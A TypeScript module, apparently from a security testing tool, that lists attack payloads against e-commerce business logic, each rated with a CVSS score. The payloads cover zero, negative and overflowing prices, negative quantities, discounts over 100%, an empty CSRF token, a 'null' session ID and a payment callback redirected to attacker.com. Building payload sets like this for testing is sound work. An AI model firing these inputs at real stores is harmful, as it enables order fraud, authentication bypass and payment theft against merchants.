/**
 * Payload Library - Curated attack payloads
 */

export interface PayloadEntry {
    value: unknown;
    type: string;
    category: string;
    description: string;
    expectedBehavior: string;
    cvss?: number;
}

export const PAYLOAD_LIBRARY: PayloadEntry[] = [
    // Price Manipulation
    { value: 0, type: 'zero_price', category: 'price', description: 'Zero price bypass', expectedBehavior: 'Order created at $0', cvss: 9.8 },
    { value: -1, type: 'negative_price', category: 'price', description: 'Negative price for credit', expectedBehavior: 'Credit added to account', cvss: 9.8 },
    { value: 0.01, type: 'minimal_price', category: 'price', description: 'Penny price bypass', expectedBehavior: 'Order for $0.01', cvss: 9.5 },
    { value: 2147483648, type: 'int_overflow', category: 'price', description: 'Integer overflow', expectedBehavior: 'Price wraps to negative', cvss: 8.5 },
    { value: '1e-100', type: 'scientific_notation', category: 'price', description: 'Scientific notation tiny value', expectedBehavior: 'Parsed as effectively zero', cvss: 7.5 },

    // Quantity Manipulation
    { value: -1, type: 'negative_qty', category: 'quantity', description: 'Negative quantity', expectedBehavior: 'Credit or free items', cvss: 8.0 },
    { value: 0, type: 'zero_qty', category: 'quantity', description: 'Zero quantity checkout', expectedBehavior: 'Order with no items but discounts', cvss: 6.0 },
    { value: 999999999, type: 'huge_qty', category: 'quantity', description: 'Inventory depression', expectedBehavior: 'Deplete inventory', cvss: 5.0 },
    { value: [1, -100], type: 'array_qty', category: 'quantity', description: 'Array quantity injection', expectedBehavior: 'Sum or last value used', cvss: 7.0 },

    // Discount Manipulation
    { value: 101, type: 'over_100_percent', category: 'discount', description: 'Discount > 100%', expectedBehavior: 'Negative total / credit', cvss: 9.0 },
    { value: -50, type: 'negative_discount', category: 'discount', description: 'Negative discount', expectedBehavior: 'Price increase (testing)', cvss: 3.0 },
    { value: 'COUPON', type: 'common_code', category: 'discount', description: 'Common coupon code', expectedBehavior: 'Valid discount applied', cvss: 4.0 },

    // Session/Auth
    { value: '', type: 'empty_token', category: 'session', description: 'Empty CSRF token', expectedBehavior: 'Request accepted', cvss: 8.0 },
    { value: 'null', type: 'null_session', category: 'session', description: 'Null session ID', expectedBehavior: 'Access without auth', cvss: 9.0 },

    // Payment
    { value: 0.01, type: 'minimal_amount', category: 'payment', description: 'Pay minimal but get full order', expectedBehavior: 'Amount mismatch accepted', cvss: 10.0 },
    { value: 'http://attacker.com/callback', type: 'malicious_callback', category: 'payment', description: 'Redirect payment callback', expectedBehavior: 'Callback to attacker', cvss: 8.0 },
];

/**
 * Get payloads by category
 */
export function getPayloadsByCategory(category: string): PayloadEntry[] {
    return PAYLOAD_LIBRARY.filter(p => p.category === category);
}

/**
 * Get high-impact payloads
 */
export function getHighImpactPayloads(minCvss: number = 8.0): PayloadEntry[] {
    return PAYLOAD_LIBRARY.filter(p => (p.cvss || 0) >= minCvss);
}
